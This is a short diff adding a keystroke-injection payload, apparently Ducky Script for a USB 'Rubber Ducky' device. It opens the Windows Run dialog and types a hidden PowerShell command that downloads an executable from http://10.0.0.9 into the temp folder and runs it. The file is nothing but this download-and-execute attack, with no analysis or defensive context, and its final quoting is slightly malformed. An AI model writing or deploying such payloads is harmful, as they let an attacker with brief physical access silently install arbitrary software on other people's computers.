@@ -1,0 +1,6 @@
+DELAY 2000
+GUI r
+DELAY 800
+STRING powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('http://10.0.0.9/sc7_installer64.exe','%TEMP%\sc7_installer64.exe');Start-Process "%TEMP%\sc7_installer64.exe;"
+ENTER
+
